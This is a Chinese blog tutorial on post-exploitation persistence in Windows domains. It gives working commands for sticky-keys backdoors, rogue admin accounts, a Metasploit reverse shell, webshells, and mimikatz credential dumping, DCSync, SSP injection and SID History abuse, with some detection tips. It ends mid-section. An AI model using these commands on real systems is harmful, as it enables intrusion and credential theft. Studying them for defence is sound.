<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>权限维持 - Guko's Blog</title><meta name="description" content="通过建立后门来维持对目标主机的控制权操作系统后门操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证过程来维持对目标系统的控制权及隐匿控制行为的方法。粘滞键后门粘滞键后门是一种常见的持续控制方法在windows主机上连续按5此shift键，可调出粘滞键。Windows的粘滞键只要是为无法同时按多"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">权限维持</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">权限维持</h1><div class="post-meta">2020-10-26<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>通过建立后门来维持对目标主机的控制权</p>
<a id="more"></a>

<h4 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h4><p>操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证过程来维持对目标系统的控制权及隐匿控制行为的方法。</p>
<h5 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h5><p><code>粘滞键后门</code>是一种常见的持续控制方法</p>
<p>在windows主机上连续按5此<code>shift</code>键，可调出粘滞键。Windows的粘滞键只要是为无法同时按多个键的用户设计的。</p>
<p>用可执行文件<code>sethc.exe.bak</code>替换<code>windows\system32</code>目录下的粘滞键可执行文件<code>sethe.exe</code>连续按5次<code>shift</code>键，将弹出命令行窗口，可以直接<code>system</code>权限执行系统命令、创建管理员用户、登录服务器等</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\WINDOWS\system32\cmd.exe C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/2.png" alt></p>
<p>注销，在登录页面按<code>5次shift</code>键调用后门</p>
<p><img src="/2020/10/26/权限维持/3.png" alt></p>
<p>通过命令添加管理员登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user gkk test@123 /add &amp;&amp; net localgroup administrators gkk /add</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/4.png" alt></p>
<p>除了手动的还可以直接使用<code>Empire</code>来实现这一功能,之前有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debugger</span><br><span class="line">set Listener</span><br><span class="line">set ComputerName WIN7-X64-TEST.hacke.testlab</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/5.png" alt></p>
<p>运行后，在目标主机登录窗口按5次<code>Shift</code>键即可触发后门</p>
<h5 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h5><p>在普通用户权限下，将需要执行的后门程序或者脚本路径填写到注册表键<code>HKCU:Software\Microsoft\Windows\CurrentVersion\Run</code>中，键名可以随意设置</p>
<p>依旧使用<code>Empire</code>实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/registry*</span><br><span class="line">set Listener </span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p>重启目标机,会弹个黑框，之后就会收到反弹的<code>shell</code></p>
<p><img src="/2020/10/26/权限维持/6.png" alt></p>
<h5 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h5><p>计划任务在windows7及之前版本的操作系统中使用<code>at命令</code>调用，在从windows8本本开始的操作系统中使用<code>schtasks命令</code>调用。计划任务后门分为管理员权限和普通用户两种。管理员权限的后门可以设置更多的计划任务，例如重启后运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /tn Updater /tr notepad.exe /sc hourly /mo 1</span><br></pre></td></tr></table></figure>

<p>常见模拟计划任务后门</p>
<p><strong>1、在metasploit中模拟计划任务后门</strong></p>
<p>使用metasploit的Powershell payload web Delivery模块，可以模拟攻击者在目标系统中快速建立会话的行为。该行为不会被写入磁盘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line">set target 2</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set lport 443</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>在目标系统中输入生成的后门代码，就会创建一个新的会话</p>
<p><img src="/2020/10/26/权限维持/7.png" alt></p>
<p>*<em>2、在powerSploit中模拟计划任务后门 *</em></p>
<p>使用PowerShell版本的PowerSploit渗透测试框架的Persistence模块，可以模拟生成一个自动创建计划任务的后门脚本</p>
<p>上传到目标后，导入脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Persistence.psm1</span><br></pre></td></tr></table></figure>

<p>如下命令，使用计划任务的方式创建后门。该后门会在计算机处于空闲状态时执行，执行成功后会生成名为<code>Persistence.ps1</code>的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle</span><br><span class="line">$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle</span><br><span class="line">Add-Persistence -FilePath ./shuteer.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure>

<p>Shutter.ps1是计划任务要执行的payload 可以执行如下生成该文件</p>
<p><strong>3、在Empire中模拟计划任务后门</strong></p>
<h5 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h5><h5 id="Cymothoa后门"><a href="#Cymothoa后门" class="headerlink" title="Cymothoa后门"></a>Cymothoa后门</h5><h5 id="WMI型后门"><a href="#WMI型后门" class="headerlink" title="WMI型后门"></a>WMI型后门</h5><p>WMI型后门只能由具有管理员权限的用户运行。WMI型后门具有两个特征，既无文件和无进程。基本的原理是：将代码加密存储于WMI中。</p>
<h4 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h4><p>Webshell,是一段包含ASP、ASP.NET、PHP、JSP程序的网页代码。设计构造代码，在服务器上进行一些危险的操作。</p>
<h5 id="Nishang下的Webshell"><a href="#Nishang下的Webshell" class="headerlink" title="Nishang下的Webshell"></a>Nishang下的Webshell</h5><p>Nishang是一款针对PowerShell的渗透测试工具，集成了框架、脚本。包括下载和执行、键盘记录、DNS、延时命令等脚本和各种payload</p>
<h5 id="Weevely后门"><a href="#Weevely后门" class="headerlink" title="Weevely后门"></a>Weevely后门</h5><p><code>weevely</code>是一款用python语言编写的针对PHP平台的Webshell，下载地址：<a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener">https://github.com/epinna/weevely3</a></p>
<p>主要功能如下：</p>
<ul>
<li>执行命令和浏览远程文件</li>
<li>检测常见的服务器配置问题</li>
<li>创建TCP Shell 和Revers Shell</li>
<li>扫描端口</li>
<li>安装HTTP代理</li>
</ul>
<p>在kali中输入<code>weevely</code>查看帮助信息</p>
<p><img src="/2020/10/26/权限维持/8.png" alt></p>
<ul>
<li>weekly<url><password>[cmd]：链接一句话木马</password></url></li>
<li>Weekly session<path></path>[cmd]:加载会话文件</li>
<li>Weekly generate<password><path></path>:生成后门代理</password></li>
</ul>
<p>如下生成一个<code>webshell</code>，命令为<code>test.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate test /home/kali/Desktop/test.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/9.png" alt></p>
<p>在把生成的后门文件上传的目标主机后，在当前机器输入如下命令连接<code>webshell</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://127.0.0.1/test.php test</span><br></pre></td></tr></table></figure>

<p>查看帮助信息<code>help</code></p>
<p><code>system_info</code>查看目标主机系统信息</p>
<p>扫描目标主机的指定端口<code>net_scan xx.xx.xx.xx:88</code></p>
<p>扫描目标主机的内网IP地址段<code>net_scan xx.xx.xx.xx/24:80</code></p>
<h5 id="webacoo后门"><a href="#webacoo后门" class="headerlink" title="webacoo后门"></a>webacoo后门</h5><p><code>webacoo(Web Backdoor Cookie)</code>是一款针对PHP平台的We后门工具,最新版已去除，老版本的kali自带</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -h</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/10.png" alt></p>
<p>如下命令，生生一个webshell，并保存为test.<em>php</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o /root/桌面/test.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/11.png" alt></p>
<p>将生成的后门文件上传到目标服务器后使用如下命令连接<code>webshell,</code>连接成功后，可以使用<code>load</code>命令查看模块，并可以进行上传、下载、连接数据库等操作，<code>exit</code>退出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u http://127.0.0.1/test.php</span><br></pre></td></tr></table></figure>

<h5 id="ASPX-meterprter后门、PHP-meterpreter后门等"><a href="#ASPX-meterprter后门、PHP-meterpreter后门等" class="headerlink" title="ASPX meterprter后门、PHP meterpreter后门等"></a>ASPX meterprter后门、PHP meterpreter后门等</h5><p>参考：<a href="[https://pingmaoer.github.io/2020/03/06/%E5%88%A9%E7%94%A8msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/](https://pingmaoer.github.io/2020/03/06/利用msfvenom生成木马/)">利用msfvenom生成木马</a></p>
<h4 id="域控制器权限持久化"><a href="#域控制器权限持久化" class="headerlink" title="域控制器权限持久化"></a>域控制器权限持久化</h4><p>在获取域控制器权限后，拥有域管理员权限的情况下将权限持久化的方法</p>
<h5 id="DSRM域后门"><a href="#DSRM域后门" class="headerlink" title="DSRM域后门"></a>DSRM域后门</h5><p><strong>1、DSRM域后门简介</strong></p>
<p><code>DSRM(Directory Services Restore Mode,目录服务恢复模式)</code>是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户（也就是DSRM账户）。DSRM的用途是：允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM的密码在安装DC时设置，且很少会被重置。<code>修改DSRM密码</code>最基本的方法是在DC上运行<code>ntdsutil</code>命令行工具。</p>
<p>渗透中，可以使用DSRM账号对域环境进行持久化操作。如果域控制器的系统版本为windows server 2008 需要安装KB961320才可以使用制定域账号的密码对DSRM的密码进行通过。在windows server 2008以后版本的系统中不需要安装此补丁。windows server 2003无法使用此方法</p>
<p>每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器</p>
<p><strong>2、修改DSRM密码的方法</strong></p>
<p>微软公布的修改DSRM密码的方法。在域控制器上打开命令行环境，常用命令如下：</p>
<ul>
<li>NTDSUTIL:打开ntdsuti</li>
<li>Set dorm password:设置DSRM的密码</li>
<li>reset password on server null:在当前域控控制器上恢复DSRM密码</li>
<li><password>：修改后的密码</password></li>
<li>q(第1次)：退出DSRM密码设置模式</li>
<li>q(第2次)：退出ntdsutil</li>
</ul>
<p>如果域控制器的系统版本为windows server 2008（已安装KB961320）及以上，可以将DSRM密码同步为已存在的域账号密码。常用命令如下</p>
<ul>
<li>NTDSUTIL:打开ntdsutil</li>
<li>SET DSRM PASSWORD：设置DSRM密码</li>
<li>SYNCFROM DOMAIN ACCOUNT domainusername:使DSRM的密码和制定用户的密码同步</li>
<li>q(第1次)：退出DSRM密码设置模式</li>
<li>q(第2次)：退出ntdsutil</li>
</ul>
<p><strong>3、实验操作</strong></p>
<p>（1）使用mimikatz查看<code>krbtgt的NTLM Hash</code></p>
<p>在域控制器中打开mimikatz,分别输入如下命令，显示<code>krbtgt</code>的<code>NTLM Hash</code>为<code>ff73ba115f7d6145f4c2e41f97f9a320</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch /name:krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/12.png" alt></p>
<p>（2）使用mimikatz查看并读取<code>SAM</code>文件中本地管理员的<code>NTLM Hash</code></p>
<p>在域控制器中运行mimikatz，输入如下命令，显示<code>DSRM账号的NTLM Hash</code>为<code>09bc0266e773764dc3606744ddbe133d</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//token::elevate</span><br><span class="line">//lsadump::sam</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/13.png" alt></p>
<p>（3）将<code>DSRM账号</code>和<code>krbtgt的NTLM Hash</code>同步</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET DSRM PASSWORD</span><br><span class="line">SYNC FROM DOMAIN account krbtgt</span><br></pre></td></tr></table></figure>

<p>（4）查看DSRM的NTLM Hash是否同步成功</p>
<p>通过mimikatz，得到DSRM账号的NTLM Hash为</p>
<p>（5）修改DSRM的登录方式</p>
<p>在注册表中新建HKLM\System\Currentcontrol\Lsa\DsrmAdminLogonBehavior项</p>
<p>DSRM的三种登录方式，具体如下</p>
<ul>
<li>0:默认值，只用当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li>
<li>1:只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li>
<li>2:在任何请款修改，都可以使用DSRM管理员账号登录域控制器</li>
</ul>
<p>需要注意，Windows server 2000以后版本的操作系统中，对DSRM使用控制台登录域控制器进行了限制</p>
<p>如果要使用DSRM账号通过网络登录域控制器，需要将该值设置为2。输入如下命令，可用powershell进行更改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-Itemproperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>

<p>（6）使用DSRM账号通过网络远程登录域控制器</p>
<p>使用mimikatz进行哈希传递。在域成员机器的管理员模式下打开mimikatz，分别输入输入命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:DC /user:Administrator /ntlm:</span><br></pre></td></tr></table></figure>

<p>（7）使用mimikatz的dcysnc功能远程转储krbtgt的NTLM Hash</p>
<p>哈奇传递完成后，会弹出一个命令行窗口，输入如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:hacke.testlab /dc:dc /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><strong>4、DSRM域后门检测</strong></p>
<ul>
<li>定期检查注册表中用于控制DSRM登录方式的键值HKLM\System\CurentControlSet\Control\Lsa\DSRMAdminLogonBehavior，确认该键值为1，或者删除该键值</li>
<li>定期修改域中所有域控制器的DSRM账号</li>
<li>经常检查ID为4794的日志。尝试设置活动目录服务还原模式的管理员密码会被记录在4794日志中</li>
</ul>
<h5 id="组策略后门"><a href="#组策略后门" class="headerlink" title="组策略后门"></a>组策略后门</h5><p>域组策略和执行脚本存放在域控制器的<code>SYSVOL</code>目录下，所有域用户均可访问它们，但只有高权限用户有修改权限。在登录域时，域账号会查询并执行属于自己的域组策略及执行脚本。在域组策略中，我们可以添加计划任务等让域内主机执行目标文件</p>
<p>因此，如果低权限用户具备<code>SYSVOL</code>目录的修改权限，就可以进行域控制器的权限维持。</p>
<p>（1）查看域控制器共享文件，执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">net view \\dc.hacke.testlab</span><br><span class="line">dir \\dc.hacke.testlab\SYSVOL</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/45.png" alt></p>
<p>（2）在域控制器的SYSVOL目录下添加zhangsan用户密码为test@123的控制权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user zhangsan test@123 /add &amp;&amp; net localgroup administrators zhangsan /add</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/46.png" alt></p>
<p><img src="/2020/10/26/权限维持/47.png" alt></p>
<p>（3）向域控制器的<code>SYSVOL</code>目录内写入文件并进行文件目录和类型的查看，执行如下命令，可以看到普通用户拥有了对域控制器SYSVOL目录读写的权限。这之后我们就可以修改组策略，实现隐蔽后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;demo&quot; &gt;\\dc.hacke.testlab\SYSVOL\sanr.text</span><br><span class="line">dir \\dc.hacke.testlab\SYSVOl</span><br><span class="line">tyep \\dc.hacke.testlab\SYSVOL\sanr.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/48.png" alt></p>
<p>（4）利用MS15-011漏洞进行权限维持</p>
<p>window域成员机器每间隔90min+random()*30min就会向域控制器请求更新组策略，并以gpt.ini文件中的版本信息来判断是否正在使用最新的域策略。如果gpt.ini的版本信息较低，域成员机器会请求GptTmpl.inf文件的策略进行更新。</p>
<p>为了利用该漏洞，我们需要修改<code>Version</code>的值，路径在<code>C:\Windows\SYSVOL\domain\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}</code>中的<code>GPT.INI</code></p>
<p><img src="/2020/10/26/权限维持/49.png" alt></p>
<p>我们利用默认域组策略GUID:{31B2F340-016D-11D2-945F-00C04FB984F9}进行权限维持。域策略中的文件GptTmpl.inf（目录为C:\Windows\SYSVOL\domain\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf）用于存储组策略的配置，如密码复杂度是否启用、密码最长期限、最短密码长度等。</p>
<p>其中有一项是注册表，我们可以把注册表项已有的配置信息替换为指定的恶意配置信息，等域成员机器更新组策略时，组策略文件就会被下载到域成员的机器中执行并修改注册表的内容，执行指定的恶意程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Registry Values]</span><br><span class="line">MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/50.png" alt></p>
<p>我们需要修改[Registry Values]项为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger=1,C:\Windows\System32\calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/51.png" alt></p>
<p>这段代码用到了映像劫持<code>（Image File Execution Options）</code>技术。就是打开A程序的同时会执行B程序。当域成员更新完组策略后，会运行cmd.exe和calc.exe程序。我们可以根据需求对cmd.exe和calc.exe程序进行修改。</p>
<p>最后更新组策略</p>
<p><img src="/2020/10/26/权限维持/53.png" alt></p>
<h5 id="SSP维持域控制权限"><a href="#SSP维持域控制权限" class="headerlink" title="SSP维持域控制权限"></a>SSP维持域控制权限</h5><p><code>SSP(Security Support Provider)</code>是Windows操作系统安全机制的提供者。简单说SSP是一个DLL文件，主要用来实现windows操作系统的身份认证功能，如NTLM、kerberos、Negotiate、Secure Channel(Schannel)、Digest、Credential(CredSSP)</p>
<p>SSPI(Security Support Provider Interface安全支持提供程序接口)是windows操作系统在执行认证操作时使用的API接口。可以说SSPI是SSP的API接口</p>
<p>如果获得了网络中目标机器的system权限，可以使用该方法进行持久化操作。其主要原理是LSA(Loacl Security Authority)用于身份验证；lsass.exe作为Windows系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe进程中。但是，如果我们对LSA进行了扩展，自定义了恶意DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。</p>
<p><strong>1、实验</strong></p>
<p>第一个实验，使用<code>mimikatz</code>将伪造的<code>SSP</code>注入内存。这样做不会在系统中留下二进制文件，但如果域控制器重启，被注入内存的伪造的SSP将会丢失。</p>
<p>在域控制器中以管理员权限打开<code>mimikatz</code>，输入如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p>注销当前用户。注入用户名和密码后重新登录，获取明文密码，密码存储在日志文件<code>C:\Windows\System32\mimilsa.log</code>中</p>
<p><img src="/2020/10/26/权限维持/15.png" alt></p>
<p>第二个实验，将<code>mimikatz中的mimilib.dl</code>l放到系统的<code>C:\Windows\System32\</code>目录下，并将<code>mimiliv.dll</code>添加到注册表中。这种方法，及时系统重启，也不会影响持久化效果</p>
<p>将mimikatz中的<code>mimilib.dll</code>复制到系统的<code>C:\Windows\System32\</code>目录下</p>
<p><img src="/2020/10/26/权限维持/16.png" alt></p>
<p>修改<code>HKEY_LOCAL_MACHINE\System\CurrentSet\Control\Lsa\Security Packages</code>项，加载新的<code>DLL</code>文件</p>
<p><img src="/2020/10/26/权限维持/17.png" alt></p>
<p>命令模式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy mimilib.dll %systemroot%\system32</span><br><span class="line"></span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot; </span><br><span class="line"></span><br><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br></pre></td></tr></table></figure>

<p>系统重启后，如果DLL被成功加载，用户在登录时输入的账号和密码明文就会被记录在<code>C:\Windows\System32\kiwissp.log</code>中</p>
<p><img src="/2020/10/26/权限维持/18.png" alt></p>
<p><strong>2、SSP维持域控制器检测</strong></p>
<ul>
<li>检查HKEY_LOCAL_MACHINE\System\CurrentSet\Control\Lsa\Security Package项中是否含有可疑的DLL文件</li>
<li>检查C:\Windows\System32\目录下是否有可疑的DLL文件</li>
<li>使用第三方工具检查LSA中是否有可疑的DLL文件</li>
</ul>
<h5 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h5><p>每个用户都有自己的SID。SID的作用主要是跟踪安全主题控制用户连接资源时的访问权限。<code>SID History</code>是在域迁移过程中需要使用的一个属性。</p>
<p>如果将A域中的域用户迁移到B域中，那么在B域中新建的用户的SID会随之改变，进而影响前一后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。<code>SID History</code>的作用是在域迁移过程中保持域用户的访问权限，既如果迁移后的用户保持原有权限、能够访问其原来可以访问的资源。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在获取了域管理员权限（或者等同于域管理员的权限）就可以将SID History作为实现持久化的方法</p>
<p><strong>1、实验</strong></p>
<p>将<code>Aadministrator</code>的<code>SID</code>添加到恶意用户<code>hacke</code>的<code>SID History</code>属性中。使用powershell查看<code>hacke</code>用户的<code>SID History</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser hacke -Properties sidhistory</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/19.png" alt></p>
<p>打开一个具有域管理严的命令行窗口，运行mimikatz，将Administrator的SID添加到hacke用户的SID History属性中。注意：在使用mimikatz注入SID之前，需要使用<code>sid::patch</code>命令修复<code>NTDS</code>服务，否则无法将高权限的ISD注入低权限用户的SID History属性;mimikatz在2.1版本后，将misc::addsid模块移到了sid::add模式下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:hacke /new:administrator</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/20.png" alt></p>
<p>再次使用powershell查看<code>hacke</code>用户的<code>SID History</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser hacke -Properties sidhistory</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/26/权限维持/21.png" alt></p>
<p>使用<code>hacke</code>用户登录系用，测试其是否具有<code>Administrator</code>的权限。尝试列出域控制器<code>C盘</code>的目录</p>
<p><img src="/2020/10/26/权限维持/22.png" alt></p>
<p><strong>2、SID History域后门防御</strong></p>
<p>先列一下SID History域后门的特点</p>
<ul>
<li>在控制域控制器后，可以通过注入SID History属性完成持久化任务</li>
<li>拥有高权限SID的用户，可以使用powershell远程导出域控制器的ntds.dit</li>
<li>如果不再需要通过SID History属性实现持久化，可以在mimikatz中执行<code>sid::clear /sam:username</code>,清除SID History属性</li>
</ul>
<p>SID History 域后门的防御措施</p>
<ul>
<li>经常c哈看域用户中SID为500的用户</li>
<li>完成域迁移工作后，对有相同SID History属性的用户进行检查</li>
<li>定期检查ID为4765和4766的日志。4765为将SID History属性添加到用户的日志。4766为将SID History属性添加到用户失败的日志</li>
</ul>
<h5 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h5><p>假设域内存在一个<code>SID为502</code>的域账号<code>krbtg</code>t。<code>krbtgt</code>是<code>KDC</code>服务使用的账号，属于<code>Domain Adminis</code>组。在域环境中，每个用户账号的票据都是由<code>krbtgt</code>生成的，如果拿到了<code>krbtgt</code>的<code>NTLM Hash</code>或者<code>AES-256</code>值，就可以伪造域内任意用户的身份，并以该用户的身份访问其他服务。</p>
<p>在使用<code>Golden Ticket（黄金票据）</code>进行票据传递攻击时，需要掌握以下信息</p>
<ul>
<li>需要伪造的域管理员用户名</li>
<li>完整的域名</li>
<li>域SID</li>
<li>krbtgt的NTLM Hash或AES-256值</li>
</ul>
<p>实验环境</p>
<p>域控制器</p>
<ul>
<li>IP地址：192.168.1.1</li>
<li>域名：hacke.testlab</li>
<li>用户名：administrator</li>
<li>密码：Admin!@#$4321</li>
</ul>
<p>域成员服务器</p>
<ul>
<li>IP地址：192.168.1.2</li>
<li>域名：hacke.testlab</li>
<li>用户名:testuser</li>
<li>密码：Admin!@#$1234</li>
</ul>
<p><strong>1、导出krbtgt的NTLM Hash</strong></p>
